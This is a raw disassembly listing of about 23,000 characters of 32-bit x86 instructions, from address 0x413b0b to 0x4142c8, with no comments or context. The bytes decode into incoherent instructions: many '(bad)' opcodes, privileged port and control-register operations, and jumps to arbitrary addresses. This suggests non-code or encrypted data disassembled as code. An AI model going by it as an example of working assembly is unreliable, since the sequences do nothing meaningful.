  413b0b:	mov    cr1,esp
  413b0e:	sbb    eax,0xa1d315aa
  413b13:	bound  edx,QWORD PTR [eax-0x7b]
  413b16:	mov    ch,0x4
  413b18:	pusha  
  413b19:	loope  0x413af7
  413b1b:	iret   
  413b1c:	pusha  
  413b1d:	push   ecx
  413b1e:	add    al,BYTE PTR [edi+0x65898fd6]
  413b24:	out    dx,al
  413b25:	sbb    bl,BYTE PTR [ebp-0x7039bd76]
  413b2b:	(bad)  
  413b2c:	jbe    0x413b49
  413b2e:	int3   
  413b2f:	repnz imul esi,DWORD PTR [esi-0x46],0x20fa1964
  413b37:	aas    
  413b38:	jmp    0xad94bb8b
  413b3d:	xor    ebx,DWORD PTR [ebx+0x53]
  413b40:	jl     0x413b03
  413b42:	outs   dx,BYTE PTR ds:[esi]
  413b43:	push   esp
  413b44:	sti    
  413b45:	sahf   
  413b46:	mov    edi,0x6b76968a
  413b4b:	mov    dl,0x34
  413b4d:	out    0x48,eax
  413b4f:	inc    eax
  413b50:	bound  dx,DWORD PTR [eax+0x372cd38b]
  413b57:	sti    
  413b58:	fadd   QWORD PTR [edi]
  413b5a:	xchg   BYTE PTR [edi+0x7c3c6fa2],al
  413b60:	leave  
  413b61:	out    dx,al
  413b62:	fldenv [esi]
  413b64:	in     al,dx
  413b65:	fisttp DWORD PTR [ecx+0x18646cdf]
  413b6c:	or     BYTE PTR [ebx],bh
  413b6e:	mov    ah,0xec
  413b70:	fnstenv [eax+0xa]
  413b73:	into   
  413b74:	outs   dx,DWORD PTR ds:[esi]
  413b75:	push   ebp
  413b76:	xchg   edi,eax
  413b77:	xchg   DWORD PTR [edi-0x89e11eb],edi
  413b7d:	jo     0x413b1b
  413b7f:	jg     0x413ba7
  413b81:	sbb    BYTE PTR [ebx-0x1541295a],bl
  413b87:	push   esi
  413b88:	jne    0x413b9a
  413b8a:	push   esp
  413b8b:	jle    0x413bfa
  413b8d:	(bad)  
  413b8e:	fsubr  QWORD PTR [edx]
  413b90:	dec    esp
  413b91:	les    edi,FWORD PTR [ecx+ebp*8]
  413b94:	test   bl,0x71
  413b97:	mov    bh,0x61
  413b99:	mov    BYTE PTR [edx],ch
  413b9b:	sbb    BYTE PTR [edi],bh
  413b9d:	sti    
  413b9e:	cs xor al,0xd5
  413ba1:	nop
  413ba2:	repz mov bh,0x89
  413ba5:	aam    0x6a
  413ba7:	or     eax,0xa92964b2
  413bac:	shl    DWORD PTR [ebp+0x39],cl
  413baf:	pushf  
  413bb0:	adc    BYTE PTR [edx],dl
  413bb2:	scas   eax,DWORD PTR es:[edi]
  413bb3:	lods   eax,DWORD PTR ds:[esi]
  413bb4:	cmp    eax,0xc799596a
  413bb9:	or     eax,0xdc83e1f7
  413bbe:	xor    BYTE PTR [esp+ebp*2],al
  413bc1:	or     al,0x52
  413bc3:	cmp    BYTE PTR [edi],dl
  413bc5:	cld    
  413bc6:	sbb    cl,BYTE PTR [eax+0x347b1782]
  413bcc:	adc    eax,0xfdd7e9df
  413bd1:	sahf   
  413bd2:	xor    esi,ebx
  413bd4:	mov    al,ds:0x95de1a9e
  413bd9:	and    ebx,edx
  413bdb:	xor    edx,DWORD PTR [ebp+0x60]
  413bde:	scas   eax,DWORD PTR es:[edi]
  413bdf:	xchg   edi,eax
  413be0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413be1:	cmp    eax,0x8ded53fd
  413be6:	popf   
  413be7:	lock in eax,dx
  413be9:	outs   dx,BYTE PTR ds:[esi]
  413bea:	in     al,dx
  413beb:	cmp    DWORD PTR [eax],0xffffffd1
  413bee:	inc    eax
  413bef:	push   ecx
  413bf0:	(bad)  
  413bf1:	cmp    eax,0xf0071598
  413bf6:	inc    eax
  413bf7:	xchg   edi,eax
  413bf8:	retf   
  413bf9:	xor    BYTE PTR [eax],bh
  413bfb:	and    dl,dh
  413bfd:	dec    ecx
  413bfe:	es test eax,edx
  413c01:	unpckhps xmm1,XMMWORD PTR [ecx+0x160bd25f]
  413c08:	test   BYTE PTR [ebx],cl
  413c0a:	push   ebx
  413c0b:	pop    ss
  413c0c:	adc    DWORD PTR [esi],eax
  413c0e:	or     eax,0x2464fc6a
  413c13:	(bad)  
  413c14:	xchg   ebx,eax
  413c15:	shl    DWORD PTR [eax+esi*4],cl
  413c18:	xchg   ebp,eax
  413c19:	outs   dx,BYTE PTR ds:[esi]
  413c1a:	jle    0x413c96
  413c1c:	cmp    BYTE PTR [edi+0x74],ch
  413c1f:	or     ch,BYTE PTR [edx]
  413c21:	add    al,0xaf
  413c23:	pop    edx
  413c24:	int3   
  413c25:	inc    edi
  413c26:	pop    ss
  413c27:	retf   0x7df5
  413c2a:	stos   BYTE PTR es:[edi],al
  413c2b:	ret    
  413c2c:	(bad)  
  413c2d:	call   0x441f4600
  413c32:	mov    eax,0x64889b52
  413c37:	enter  0x4559,0x5a
  413c3b:	mov    bh,BYTE PTR [eax]
  413c3d:	in     al,dx
  413c3e:	mov    eax,ds:0xc4b730e5
  413c43:	shl    DWORD PTR [ebx-0x22],cl
  413c46:	mov    esi,0x4d6b2a77
  413c4b:	sub    edx,DWORD PTR [ebx]
  413c4d:	loop   0x413c26
  413c4f:	aad    0xc
  413c51:	adc    DWORD PTR [ebp-0x40e13089],ebp
  413c57:	cld    
  413c58:	mov    esp,0x1ed90952
  413c5d:	or     al,0x75
  413c5f:	fadd   QWORD PTR [edi+0x41]
  413c62:	or     BYTE PTR [edi],0x9
  413c65:	xor    edx,DWORD PTR ds:0x3ba633b3
  413c6b:	mov    ah,0xfb
  413c6d:	shl    DWORD PTR [eax+0x60],cl
  413c70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c72:	div    DWORD PTR [esp+eiz*8]
  413c75:	call   0x72f90ff4
  413c7a:	xor    al,0x92
  413c7c:	lock rol ebx,0x3d
  413c80:	shl    ebp,1
  413c82:	and    DWORD PTR [ebx],eax
  413c84:	push   eax
  413c85:	adc    ah,bl
  413c87:	sar    BYTE PTR [eax-0x1616699c],cl
  413c8d:	repnz xchg ecx,edx
  413c90:	mov    eax,DWORD PTR [esi+0x5a71540d]
  413c96:	in     al,0x6b
  413c98:	mov    ds:0x9e894459,eax
  413c9d:	neg    BYTE PTR [ecx+0x54d9e324]
  413ca3:	sbb    esi,ebp
  413ca5:	outs   dx,DWORD PTR ss:[esi]
  413ca7:	call   0x44921d70
  413cac:	xchg   ecx,eax
  413cad:	(bad)  
  413caf:	fdiv   QWORD PTR [ebx]
  413cb1:	jb     0x413cac
  413cb3:	or     bl,dl
  413cb5:	shl    BYTE PTR ds:0x8dc25092,cl
  413cbb:	dec    ecx
  413cbc:	fs push es
  413cbe:	mov    bl,0x2e
  413cc0:	loop   0x413d3f
  413cc2:	xor    eax,0x371caf0e
  413cc7:	add    BYTE PTR [eax],dl
  413cc9:	push   ebx
  413cca:	cmp    ebx,0xdeecc4ba
  413cd0:	lods   al,BYTE PTR ds:[esi]
  413cd1:	outs   dx,BYTE PTR ds:[esi]
  413cd2:	xor    ebx,DWORD PTR [ebp+0xb]
  413cd5:	ret    0xd109
  413cd8:	aaa    
  413cd9:	sbb    DWORD PTR [edx],esp
  413cdb:	pop    ss
  413cdc:	cld    
  413cdd:	call   0xf773:0xa6030b23
  413ce4:	int    0x97
  413ce6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ce7:	cmp    al,BYTE PTR [ecx-0x7046df98]
  413ced:	cwde   
  413cee:	mov    ecx,DWORD PTR [ecx+0x59]
  413cf1:	sub    eax,0x78bf6190
  413cf6:	cmp    bl,bh
  413cf8:	repnz inc edi
  413cfa:	xchg   edi,eax
  413cfb:	fcom   QWORD PTR [edi+esi*8]
  413cfe:	(bad)  
  413cff:	jge    0x413d31
  413d01:	or     edi,esp
  413d03:	adc    ebx,DWORD PTR [ebx]
  413d05:	add    al,0x39
  413d07:	arpl   ax,bp
  413d09:	lock xchg DWORD PTR ss:[ebx-0x4a2dd447],edi
  413d11:	mov    ah,0xc4
  413d13:	inc    edi
  413d14:	cli    
  413d15:	mov    eax,0x1f5fa073
  413d1a:	pop    eax
  413d1b:	test   BYTE PTR [ebx+0x31],dh
  413d1e:	mov    ds:0xbcf96ed6,al
  413d23:	add    ebp,DWORD PTR [edi]
  413d25:	ins    DWORD PTR es:[edi],dx
  413d26:	xchg   BYTE PTR [ecx-0x65ab6257],bl
  413d2c:	fnstsw WORD PTR [edx]
  413d2e:	sar    edi,1
  413d30:	retf   
  413d31:	push   0x36957607
  413d36:	fld    DWORD PTR ss:[edx]
  413d39:	jo     0x413d8e
  413d3b:	ss inc ebp
  413d3d:	push   esi
  413d3e:	test   BYTE PTR [ecx-0x2746ef1a],bl
  413d44:	xlat   BYTE PTR ds:[ebx]
  413d45:	aaa    
  413d46:	and    al,BYTE PTR [edi]
  413d48:	loopne 0x413dad
  413d4a:	sub    eax,0xd1a8342d
  413d4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d50:	or     al,0x19
  413d52:	xor    eax,0x376f7ec7
  413d57:	and    BYTE PTR [eax],ch
  413d59:	xor    BYTE PTR [ecx],bh
  413d5b:	push   ss
  413d5c:	xor    al,0x8
  413d5e:	sub    BYTE PTR [ecx+edx*1-0x72],ah
  413d62:	sahf   
  413d63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d64:	outs   dx,DWORD PTR ds:[esi]
  413d65:	stc    
  413d66:	lods   al,BYTE PTR ds:[esi]
  413d67:	sti    
  413d68:	xor    ah,BYTE PTR [edx+0x64d8ad7d]
  413d6e:	dec    ebp
  413d6f:	jg     0x413da7
  413d71:	retf   
  413d72:	lods   al,BYTE PTR ds:[esi]
  413d73:	out    0xda,eax
  413d75:	dec    ecx
  413d76:	retf   0x9596
  413d79:	bound  edi,QWORD PTR [edx+0x34bce8aa]
  413d7f:	loope  0x413dec
  413d81:	fadd   DWORD PTR cs:[edi+0x5ff18e27]
  413d88:	sbb    eax,0x7bdb18ab
  413d8d:	pop    ss
  413d8e:	lods   eax,DWORD PTR ds:[esi]
  413d8f:	push   es
  413d90:	(bad)  
  413d91:	push   eax
  413d92:	inc    ebp
  413d93:	repz xchg ebx,eax
  413d95:	sub    cl,ah
  413d97:	jmp    0x64a8e5a
  413d9c:	jae    0x413d74
  413d9e:	inc    edx
  413d9f:	adc    DWORD PTR [edx-0x2f],ecx
  413da2:	inc    edi
  413da3:	push   edi
  413da4:	loope  0x413dc9
  413da6:	dec    BYTE PTR [ebx+0x7965ed55]
  413dac:	xchg   ebp,eax
  413dad:	sbb    eax,0x46469c0c
  413db2:	scas   eax,DWORD PTR es:[edi]
  413db3:	push   ecx
  413db4:	les    edx,FWORD PTR [eax+0x7]
  413db7:	add    BYTE PTR [ecx],bh
  413db9:	bound  ecx,QWORD PTR [edx+0xe9262a1]
  413dbf:	dec    edi
  413dc0:	jno    0x413e2c
  413dc2:	mov    DWORD PTR ds:0xf5cedd61,ebx
  413dc8:	adc    DWORD PTR [esi-0x2f],0xf9dc2347
  413dcf:	jo     0x413d82
  413dd1:	mov    dh,0x1f
  413dd3:	retf   0x8dc5
  413dd6:	cmp    edx,edx
  413dd8:	xor    eax,0x4e5733f5
  413ddd:	pop    eax
  413dde:	push   eax
  413ddf:	add    ah,ah
  413de1:	popa   
  413de2:	inc    esi
  413de3:	xchg   esi,eax
  413de4:	shr    ecx,cl
  413de6:	or     bl,dh
  413de8:	sbb    eax,0xd92674fa
  413ded:	xor    al,0x1a
  413def:	push   ss
  413df0:	popf   
  413df1:	fimul  WORD PTR [ebx+0x21]
  413df4:	jae    0x413e29
  413df6:	xchg   esi,eax
  413df7:	out    0x90,al
  413df9:	fmul   st,st(5)
  413dfb:	jmp    0xb4e62068
  413e00:	addr16 ja 0x413e7d
  413e03:	aam    0xa4
  413e05:	test   al,0x1b
  413e07:	and    DWORD PTR ds:0x80e802cb,0x32e961d6
  413e11:	int3   
  413e12:	mov    bh,0xf
  413e14:	xchg   edx,ebx
  413e16:	mov    esp,0x4335e9b1
  413e1b:	out    0x3,al
  413e1d:	daa    
  413e1e:	popa   
  413e1f:	lods   al,BYTE PTR ds:[esi]
  413e20:	xchg   edi,eax
  413e21:	out    dx,al
  413e22:	(bad)  [ecx-0x4f]
  413e25:	lea    eax,[ebp-0x6564f0f7]
  413e2b:	cmp    ebp,esp
  413e2d:	and    ebx,ebx
  413e2f:	pop    edi
  413e30:	gs jo  0x413e87
  413e33:	sar    DWORD PTR [eax],1
  413e35:	sub    ah,al
  413e37:	mov    bh,0x25
  413e39:	sub    dh,BYTE PTR [ebp+esi*4-0x2fe537d2]
  413e40:	or     al,0xcc
  413e42:	ss mov dl,0xd6
  413e45:	cmp    al,0xb6
  413e47:	(bad)  
  413e48:	inc    dh
  413e4a:	fist   WORD PTR [edx]
  413e4c:	jns    0x413eb2
  413e4e:	or     BYTE PTR [ecx],bh
  413e50:	jmp    0xdf08:0x4b23909f
  413e57:	add    BYTE PTR [edi-0x50],cl
  413e5a:	dec    ecx
  413e5b:	leave  
  413e5c:	sub    DWORD PTR [eax-0x23],esi
  413e5f:	jmp    FWORD PTR [ebp+0x77fae39d]
  413e65:	sub    esi,DWORD PTR [eax+ebx*4+0x56c0ad5b]
  413e6c:	jge    0x413e0e
  413e6e:	xchg   edi,eax
  413e6f:	mov    al,ds:0x430afd1a
  413e74:	pop    esp
  413e75:	or     DWORD PTR [ebp-0x10132b1e],ebx
  413e7b:	in     al,dx
  413e7c:	add    ch,BYTE PTR [ecx-0x3ed9854f]
  413e82:	nop
  413e83:	push   0x5c070d76
  413e88:	ret    0xf3c6
  413e8b:	add    al,BYTE PTR [edx]
  413e8d:	xchg   esi,eax
  413e8e:	adc    al,0xff
  413e90:	out    dx,al
  413e91:	pop    gs
  413e93:	or     DWORD PTR fs:[bp+di-0x3555],ecx
  413e99:	xor    dh,ch
  413e9b:	push   ecx
  413e9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e9d:	add    al,0xab
  413e9f:	dec    edi
  413ea0:	mov    cl,0x7a
  413ea2:	out    dx,eax
  413ea3:	push   eax
  413ea4:	(bad)  
  413ea5:	fldenv [ecx-0x1e5b2a00]
  413eab:	mov    esp,0xac0844a7
  413eb0:	hlt    
  413eb1:	mov    bh,0xdf
  413eb3:	inc    edx
  413eb4:	xor    ecx,DWORD PTR [edi-0x5c]
  413eb7:	outs   dx,DWORD PTR ds:[esi]
  413eb8:	xor    ah,BYTE PTR [ecx-0x43a6715e]
  413ebe:	xchg   edx,eax
  413ebf:	xchg   BYTE PTR gs:0x670d8100,dh
  413ec6:	test   eax,0x6b79b3c
  413ecb:	scas   al,BYTE PTR es:[edi]
  413ecc:	outs   dx,BYTE PTR ds:[esi]
  413ecd:	shl    BYTE PTR [eax-0x39d836a2],1
  413ed3:	dec    eax
  413ed4:	ret    
  413ed5:	ss lahf 
  413ed7:	scas   al,BYTE PTR es:[edi]
  413ed8:	push   ebp
  413ed9:	pop    es
  413eda:	push   esp
  413edb:	pop    eax
  413edc:	mov    esp,0x81b5b27e
  413ee1:	imul   eax,DWORD PTR [esi-0x66],0xffffffef
  413ee5:	aad    0x22
  413ee7:	jp     0x413e8b
  413ee9:	jae    0x413f1a
  413eeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413eec:	jae    0x413f12
  413eee:	ret    
  413eef:	enter  0xace0,0xa4
  413ef3:	scas   al,BYTE PTR es:[edi]
  413ef4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ef5:	xchg   edi,eax
  413ef6:	loope  0x413e9d
  413ef8:	stos   DWORD PTR es:[edi],eax
  413ef9:	jbe    0x413f1c
  413efb:	mov    cl,0x3e
  413efd:	mov    esp,0x75286c7b
  413f02:	inc    ebx
  413f03:	or     eax,0xf94fafd1
  413f08:	xchg   DWORD PTR [edx-0x54943da1],esp
  413f0e:	jmp    0x2a379900
  413f13:	push   0xffffff82
  413f15:	cld    
  413f16:	scas   al,BYTE PTR es:[edi]
  413f17:	mov    al,0xef
  413f19:	mov    ebp,0x84cbe250
  413f1e:	cmc    
  413f1f:	mov    bl,0x12
  413f21:	push   edx
  413f22:	add    bl,BYTE PTR es:[eax]
  413f25:	or     esp,DWORD PTR [eax-0x324ecbd3]
  413f2b:	ret    
  413f2c:	in     al,0x77
  413f2e:	enter  0x245a,0xf4
  413f32:	jmp    0x3d14:0xc8973120
  413f39:	test   al,0xbc
  413f3b:	cmp    al,0x5f
  413f3d:	(bad)  
  413f3e:	(bad)  
  413f3f:	out    0x2,al
  413f41:	mov    ecx,0x7aba2b39
  413f46:	mov    ecx,0x33756f87
  413f4b:	mov    dh,0xa8
  413f4d:	(bad)  [edx-0x76263af4]
  413f53:	aad    0x41
  413f55:	fwait
  413f56:	mov    dl,0x9a
  413f58:	div    BYTE PTR [eax-0xc70c4d4]
  413f5e:	and    al,0xc6
  413f60:	lea    edx,[ecx+0x3]
  413f63:	sub    al,0xaf
  413f65:	scas   al,BYTE PTR es:[edi]
  413f66:	sub    ebp,DWORD PTR [esi+0x70a2ad2e]
  413f6c:	aas    
  413f6d:	pop    eax
  413f6e:	dec    ebx
  413f6f:	mov    ebx,0x7f9a209c
  413f74:	lods   al,BYTE PTR ds:[esi]
  413f75:	push   0x6ab15771
  413f7a:	dec    ebp
  413f7b:	lods   eax,DWORD PTR ds:[esi]
  413f7c:	out    0xdd,eax
  413f7e:	cmp    al,0x3a
  413f80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f81:	shr    ebp,cl
  413f83:	dec    edx
  413f84:	call   0xffdbad0b
  413f89:	fmul   st,st(7)
  413f8b:	call   0xce85977f
  413f90:	pushf  
  413f91:	adc    ch,BYTE PTR [esi+0x58]
  413f94:	in     al,0x3c
  413f96:	idiv   dl
  413f98:	out    dx,al
  413f99:	imul   ebp,DWORD PTR [ebp-0x183ddad],0xba0043ae
  413fa3:	add    al,0xaf
  413fa5:	cmp    BYTE PTR [ebp+0x59],dh
  413fa8:	enter  0x9bc0,0xd5
  413fac:	test   BYTE PTR [esi+0x2f9af833],bl
  413fb2:	test   al,0x87
  413fb4:	mov    ds:0xbb9623cb,eax
  413fb9:	mov    ds:0xe093d7a8,eax
  413fbe:	aas    
  413fbf:	aas    
  413fc0:	push   ebp
  413fc1:	popa   
  413fc2:	stos   DWORD PTR es:[edi],eax
  413fc3:	sbb    ebp,esi
  413fc5:	lea    edi,[ebx-0x62]
  413fc8:	gs mov dh,0x60
  413fcb:	adc    bl,dl
  413fcd:	shl    DWORD PTR [eax],cl
  413fcf:	mov    cl,0x6c
  413fd1:	jle    0x413f60
  413fd3:	aaa    
  413fd4:	xor    bh,0xd4
  413fd7:	sbb    BYTE PTR [eax],al
  413fd9:	call   0x93d5:0x3303817b
  413fe0:	xor    ah,BYTE PTR [eax+0x3e]
  413fe3:	dec    esp
  413fe4:	shr    DWORD PTR ds:0xdceb3ca6,0x21
  413feb:	sub    BYTE PTR [ebp-0x572d310b],bl
  413ff1:	(bad)  
  413ff2:	es ror al,cl
  413ff5:	pop    ds
  413ff6:	push   eax
  413ff7:	cmp    DWORD PTR [ebx],0x6f
  413ffa:	(bad)  
  413ffb:	call   0x12027e7e
  414000:	or     esp,ecx
  414002:	ret    0x4fee
  414005:	mov    ecx,0xbd7f5fe5
  41400a:	xor    ebp,DWORD PTR [ebx]
  41400c:	sub    BYTE PTR [eax+0x7713e84c],cl
  414012:	loop   0x413f9b
  414014:	xchg   esp,eax
  414015:	or     ecx,edi
  414017:	into   
  414018:	inc    edx
  414019:	mov    ch,0xc0
  41401b:	push   0x1f
  41401d:	or     ebx,edx
  41401f:	fst    DWORD PTR [eax+0x7d]
  414022:	push   ss
  414023:	cwde   
  414024:	mov    edi,0xc9cf8464
  414029:	jmp    FWORD PTR [esi]
  41402b:	lahf   
  41402c:	test   DWORD PTR [edx*2+0x7d818457],esp
  414033:	out    0xce,al
  414035:	jnp    0x414094
  414037:	repnz push eax
  414039:	cwde   
  41403a:	sbb    eax,0x90890cd3
  41403f:	aas    
  414040:	fcomp  DWORD PTR [ebx]
  414042:	call   0x990b:0xe656aa33
  414049:	cdq    
  41404a:	adc    DWORD PTR [ebp-0x783a7f7d],ebx
  414050:	sub    eax,0x61027b8a
  414055:	shr    DWORD PTR [eax],1
  414057:	push   ss
  414058:	addr16 aam 0xd3
  41405b:	inc    esi
  41405c:	imul   edi,edx,0xcba4b67f
  414062:	and    BYTE PTR [esp+esi*2],cl
  414065:	mov    ebp,0xd29643ec
  41406a:	addr16 dec edx
  41406c:	aam    0xdb
  41406e:	xchg   esi,eax
  41406f:	xlat   BYTE PTR ds:[ebx]
  414070:	call   0x1a73b37e
  414075:	fwait
  414076:	rcl    DWORD PTR [ecx+0x59039fed],0x99
  41407d:	sub    DWORD PTR [esi],esp
  41407f:	scas   eax,DWORD PTR es:[edi]
  414080:	push   ecx
  414081:	adc    edi,DWORD PTR [eax+esi*8+0x4df98ea1]
  414088:	add    al,0xc4
  41408a:	cmc    
  41408b:	dec    edi
  41408c:	sbb    dl,BYTE PTR [edi]
  41408e:	daa    
  41408f:	shr    BYTE PTR [ebp+edi*4+0x50e90322],cl
  414096:	std    
  414097:	ss jmp 0x5d5c:0x20b17431
  41409f:	mov    edi,edx
  4140a1:	mov    cl,0x25
  4140a3:	les    esi,FWORD PTR [esi-0x2400dd8e]
  4140a9:	outs   dx,BYTE PTR ds:[esi]
  4140aa:	inc    ebx
  4140ab:	out    dx,eax
  4140ac:	mov    cl,0x83
  4140ae:	int3   
  4140af:	push   ebp
  4140b0:	idiv   DWORD PTR [ecx]
  4140b2:	xchg   ebx,eax
  4140b3:	adc    al,0xbd
  4140b5:	xchg   ah,ch
  4140b7:	xchg   ecx,eax
  4140b8:	rcr    ebx,1
  4140ba:	sti    
  4140bb:	data16 jg 0x414138
  4140be:	loopne 0x414113
  4140c0:	xchg   edx,eax
  4140c1:	cs int3 
  4140c3:	shl    BYTE PTR [edi+0x51],0xb7
  4140c7:	push   edx
  4140c8:	ret    
  4140c9:	lock ds jle 0x414087
  4140cd:	mov    DWORD PTR [ebx],esp
  4140cf:	rol    BYTE PTR [eax-0x736391d6],1
  4140d5:	inc    eax
  4140d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140d7:	sub    BYTE PTR [edx-0x1a],0xb2
  4140db:	inc    eax
  4140dc:	retf   
  4140dd:	cs or  al,0x45
  4140e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140e1:	mov    ecx,0x65e165c4
  4140e6:	mov    eax,ds:0x2e237163
  4140eb:	dec    edi
  4140ec:	lea    edx,[ecx-0x10c70ebf]
  4140f2:	push   eax
  4140f3:	push   ecx
  4140f4:	xlat   BYTE PTR ds:[ebx]
  4140f5:	lock in al,0x41
  4140f8:	sub    ecx,esp
  4140fa:	mov    esi,0xfc40001f
  4140ff:	sub    al,0xf0
  414101:	test   al,0x37
  414103:	int    0x76
  414105:	mov    dl,0xfd
  414107:	shr    BYTE PTR [edx+0x2097bcb],cl
  41410d:	adc    BYTE PTR [edi-0x68609d21],bl
  414113:	pop    edx
  414114:	push   gs
  414116:	sub    ebp,ecx
  414118:	cwde   
  414119:	jecxz  0x41418c
  41411b:	int3   
  41411c:	imul   esp,DWORD PTR [edx-0x746c0743],0xffffffcc
  414123:	dec    ebx
  414124:	fcomi  st,st(4)
  414126:	mul    BYTE PTR [edx]
  414128:	ret    
  414129:	je     0x4140c4
  41412b:	lock test al,0xee
  41412e:	cdq    
  41412f:	push   esi
  414130:	sub    BYTE PTR ds:[edx+0x3a7c5458],bh
  414137:	or     al,0x90
  414139:	ror    BYTE PTR [edx-0x5d755392],0x9a
  414140:	retf   
  414141:	adc    dh,BYTE PTR [edi-0x1918b56]
  414147:	sbb    ah,BYTE PTR [eax-0x30]
  41414a:	aam    0x7b
  41414c:	(bad)  
  41414d:	loop   0x4140e1
  41414f:	test   DWORD PTR [eax+0x6d7da181],edi
  414155:	out    dx,eax
  414156:	mov    bh,0xdf
  414158:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414159:	imul   ebp,ebx,0xffffffb9
  41415c:	inc    DWORD PTR [edx-0x79]
  41415f:	xchg   ebp,eax
  414160:	sbb    BYTE PTR [esi-0x1f],ch
  414163:	cmp    DWORD PTR [ecx],0x763f5762
  414169:	or     DWORD PTR [esi-0x78da635b],eax
  41416f:	aad    0xd2
  414171:	mov    ah,0xfb
  414173:	(bad)  
  414174:	mov    edi,0x463cebc8
  414179:	jno    0x414154
  41417b:	pop    edi
  41417c:	in     eax,0x2a
  41417e:	arpl   WORD PTR [ecx],cx
  414180:	adc    al,0x60
  414182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414183:	fsub   DWORD PTR [eax-0x4523046a]
  414189:	loope  0x414139
  41418b:	mov    dl,0xae
  41418d:	test   eax,0xdf6c88c5
  414192:	aad    0x89
  414194:	outs   dx,DWORD PTR ds:[esi]
  414195:	mul    edx
  414197:	sbb    DWORD PTR [ecx-0x7a],0x236ac7cc
  41419e:	inc    ecx
  41419f:	mov    dh,0x5a
  4141a1:	std    
  4141a2:	outs   dx,BYTE PTR ds:[esi]
  4141a3:	pop    edx
  4141a4:	in     al,dx
  4141a5:	mov    edi,0x506de6a4
  4141aa:	mov    bh,0xbd
  4141ac:	ins    DWORD PTR es:[edi],dx
  4141ad:	rol    DWORD PTR [edx+0x51],cl
  4141b0:	call   0x3e0995b8
  4141b5:	scas   eax,DWORD PTR es:[edi]
  4141b6:	dec    edx
  4141b7:	xor    esp,ebx
  4141b9:	jae    0x4141e8
  4141bb:	pop    ebx
  4141bc:	neg    edi
  4141be:	stc    
  4141bf:	inc    edi
  4141c0:	jb     0x4141dc
  4141c2:	push   ebp
  4141c3:	stc    
  4141c4:	fwait
  4141c5:	lds    edi,FWORD PTR [eax+0xf]
  4141c8:	jb     0x414161
  4141ca:	mov    esi,0x125a9aa8
  4141cf:	fiadd  WORD PTR [ebp+0x36c4e593]
  4141d5:	mov    ds:0xaf892409,eax
  4141da:	pushf  
  4141db:	sahf   
  4141dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141dd:	daa    
  4141de:	retf   
  4141df:	mov    ecx,0x23d29082
  4141e4:	push   edi
  4141e5:	cli    
  4141e6:	push   ebx
  4141e7:	ret    0xce5f
  4141ea:	rcl    BYTE PTR [ebp+0x47fb2b72],cl
  4141f0:	mov    ch,0x7
  4141f2:	xor    edx,esi
  4141f4:	mov    edx,0xbc7d4593
  4141f9:	dec    edx
  4141fa:	or     eax,0x4a61c38
  4141ff:	es inc edi
  414201:	pop    ebx
  414202:	add    BYTE PTR [eax],dh
  414204:	mov    WORD PTR [edx-0x560155bc],fs
  41420a:	adc    edi,DWORD PTR [esi-0x1be572da]
  414210:	mov    esi,0xdd97200a
  414215:	(bad)  
  414216:	mov    ?,esp
  414218:	call   0x50dcf217
  41421d:	mov    edi,0xdde0b44f
  414222:	popa   
  414223:	xchg   edi,eax
  414224:	in     eax,0x27
  414226:	cmp    ecx,DWORD PTR [eax]
  414228:	mov    ebp,0x2e373418
  41422d:	mov    bl,0xa9
  41422f:	cli    
  414230:	pop    eax
  414231:	pop    ecx
  414232:	ret    0xef60
  414235:	add    BYTE PTR [edx+0x6b6fcfa3],dh
  41423b:	outs   dx,BYTE PTR ds:[esi]
  41423c:	and    al,0x40
  41423e:	retf   
  41423f:	inc    ebx
  414240:	cmp    BYTE PTR [ebp-0x11],al
  414243:	mov    dh,0x7b
  414245:	rcl    DWORD PTR [ecx+ebp*4-0x46],0x86
  41424a:	sbb    eax,DWORD PTR [edx]
  41424c:	data16 fstp DWORD PTR gs:[edi]
  414250:	rcr    edi,1
  414252:	dec    ebp
  414253:	sub    eax,0x21a55af5
  414258:	mov    esp,0xa548180d
  41425d:	or     BYTE PTR [eax+0x857113f],al
  414263:	bnd ret 0x5f08
  414267:	jmp    0x414255
  414269:	ss inc esi
  41426b:	or     al,0xa8
  41426d:	fcom   QWORD PTR [esi]
  41426f:	fs pop eax
  414271:	or     al,0x45
  414273:	inc    ebp
  414274:	stos   BYTE PTR es:[edi],al
  414275:	mov    edi,ss
  414277:	jl     0x4142e3
  414279:	sti    
  41427a:	mov    BYTE PTR [esi],ch
  41427c:	mov    ah,0xef
  41427f:	sub    edi,DWORD PTR [esp+eax*1]
  414282:	icebp  
  414283:	sahf   
  414284:	repnz xor BYTE PTR [ebp+0x63],dl
  414288:	repz retf 
  41428a:	push   esi
  41428b:	retf   
  41428c:	inc    ecx
  41428d:	inc    ebx
  41428e:	ss mov ebx,fs
  414291:	jl     0x4142c0
  414293:	push   ebx
  414294:	mov    bl,0xed
  414296:	or     eax,0x6f4ab9fc
  41429b:	stos   DWORD PTR es:[edi],eax
  41429c:	cmp    ebx,esi
  41429e:	pop    edx
  41429f:	in     al,dx
  4142a0:	mov    ecx,0xa279906b
  4142a5:	lds    esi,FWORD PTR [edx+0x2b]
  4142a8:	rcl    DWORD PTR [edx+0x8],1
  4142ab:	aaa    
  4142ac:	xchg   ebx,eax
  4142ad:	push   ss
  4142ae:	call   0xe21d:0x65ce1871
  4142b5:	dec    ebp
  4142b6:	jp     0x414293
  4142b8:	ins    BYTE PTR es:[edi],dx
  4142b9:	inc    ecx
  4142ba:	mov    ds:0x252c5a86,eax
  4142bf:	sub    ch,BYTE PTR [esi+edi*4-0x28]
  4142c3:	in     eax,0x89
  4142c5:	pop    esi
  4142c6:	aas    
  4142c7:	dec    esi
  4142c8:	or     BYTE PTR [edx+edx*8],0x88
